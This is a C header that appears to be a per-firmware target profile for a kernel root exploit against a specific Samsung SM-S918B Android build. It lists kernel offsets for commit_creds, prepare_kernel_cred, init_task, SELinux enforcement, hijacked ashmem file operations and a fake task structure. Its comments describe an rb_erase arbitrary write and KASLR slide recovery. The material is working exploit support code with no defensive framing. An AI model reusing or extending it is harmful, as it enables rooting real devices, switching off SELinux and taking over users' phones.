#ifndef OSS_CLONE_TARGET_ZZHL_H
#define OSS_CLONE_TARGET_ZZHL_H

/* From build-do-firmware/dump/kernel.raw + kernel.kallsyms; see
 * ../ZZHL/derived-target.json in the parent project. */
#define ZZHL_MODEL "SM-S918B"
#define ZZHL_DEVICE "dm3q"
#define ZZHL_FINGERPRINT \
  "samsung/dm3qxxx/dm3q:17/CP2A.260605.016/S918BXXUAZZHL:user/release-keys"
#define ZZHL_KERNEL_RELEASE \
  "5.15.197-android13-8-34343818-abS918BXXUAZZHL"

#define ZZHL_KIMAGE_TEXT_BASE 0xffffffc008000000ULL
/* Static offsets: kernel.raw/kallsyms, then confirmed live on boot
 * 6584b354 with KASLR slide +0xe8000. */
#define ZZHL_WORKER_THREAD_OFF 0x0010dd84ULL
#define ZZHL_WORKER_CALLER_OFF 0x0010ddfcULL /* worker_thread + 0x78 */
#define ZZHL_INIT_TASK_OFF 0x02c05380ULL
#define ZZHL_PREPARE_KERNEL_CRED_OFF 0x0011e694ULL
#define ZZHL_COMMIT_CREDS_OFF 0x001203d0ULL
#define ZZHL_OVERRIDE_CREDS_OFF 0x0011f4a8ULL
#define ZZHL_ASHMEM_MISC_FOPS_OFF 0x02bfd1f8ULL
#define ZZHL_ASHMEM_FOPS_OFF 0x02010238ULL
#define ZZHL_ASHMEM_IOCTL_OFF 0x01151344ULL
#define ZZHL_ASHMEM_COMPAT_IOCTL_OFF 0x011519a0ULL
#define ZZHL_ASHMEM_MMAP_OFF 0x011519f8ULL
#define ZZHL_ASHMEM_OPEN_OFF 0x01151cd8ULL
/* task_struct->pi_waiters rbtree. Same offsets the fake task mirrors in
 * fops_install.c (0x3200+0x898 rb_root, +0x8a0 rb_leftmost); confirmed via
 * BTF/pahole. Used to repair the victim task's pi_waiters after the
 * rb_erase-based AAW leaves it dangling. */
#define ZZHL_TASK_PI_WAITERS_ROOT_OFF 0x898ULL
#define ZZHL_TASK_PI_WAITERS_LEFTMOST_OFF 0x8a0ULL
#define ZZHL_FOPS_OWNER_OFF 0x000ULL
#define ZZHL_FOPS_FLUSH_OFF 0x078ULL
#define ZZHL_ASHMEM_RELEASE_OFF 0x01151d70ULL
#define ZZHL_FOPS_RELEASE_OFF 0x080ULL
#define ZZHL_ASHMEM_SHOW_FDINFO_OFF 0x01151e8cULL
#define ZZHL_CONFIGFS_READ_ITER_OFF 0x005d89c0ULL
#define ZZHL_CONFIGFS_BIN_WRITE_ITER_OFF 0x005d93e8ULL
#define ZZHL_COPY_SPLICE_READ_OFF 0x00528dccULL
#define ZZHL_NOOP_LLSEEK_OFF 0x004bc658ULL
#define ZZHL_DEFAULT_LLSEEK_OFF 0x004ba720ULL
#define ZZHL_VFS_SETLEASE_OFF 0x004b8f28ULL
#define ZZHL_ITER_FILE_SPLICE_WRITE_OFF 0x00574578ULL
#define ZZHL_ROOT_TASK_GROUP_OFF 0x02cb9ac0ULL
#define ZZHL_KMALLOC_CACHES_OFF 0x02067330ULL
#define ZZHL_ANON_PIPE_BUF_OPS_OFF 0x01e81e60ULL
#define ZZHL_SYSTEM_UNBOUND_WQ_OFF 0x02a90808ULL
#define ZZHL_CALL_USERMODEHELPER_EXEC_WORK_OFF 0x00104888ULL
/* BTF: selinux_state.enforcing is byte zero of selinux_state. */
#define ZZHL_SELINUX_STATE_ENFORCING_OFF 0x02d8e600ULL
#define ZZHL_SIGRETURN_BSS_BASE_OFF 0x02d85938ULL
#define ZZHL_SIGRETURN_BSS_SLOT_STRIDE 0x100ULL
#define ZZHL_SIGRETURN_BSS_SLOT_MAX 0x0fU
#define ZZHL_SIGRETURN_INITIAL_LOCK_DELTA 0x1200ULL
#define ZZHL_SIGRETURN_WRITE_LOCK_DELTA 0x1280ULL
#define ZZHL_SIGRETURN_CLEANUP_LOCK_DELTA 0x1300ULL
#define ZZHL_SIGRETURN_GHOST_TASK_DELTA 0x3200ULL
#define ZZHL_SIGRETURN_GHOST_TASK_OFF \
  (ZZHL_SIGRETURN_BSS_BASE_OFF + ZZHL_SIGRETURN_GHOST_TASK_DELTA)

/* Slide route constants from the open ZZHL profile. The object symbols and
 * boot-id locations were checked against the live unmasked kallsyms. */
#define ZZHL_SLIDE_NFULNL_LOGGER_NAME_OFF 0x01d60919ULL
#define ZZHL_SLIDE_NFULNL_LOGGER_OBJECT_OFF 0x02a91e50ULL
#define ZZHL_SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x02bbab48ULL
#define ZZHL_SLIDE_SYSCTL_BOOTID_OFF 0x02e6c131ULL

/* DiamondFox BSS geometry is KASLR-adjusted at runtime. A root witness is
 * optional instrumentation only; it never supplies exploit object addresses. */
#define ZZHL_DENTRY_FOPS_PREFLIGHT_IMPLEMENTED 1

#endif
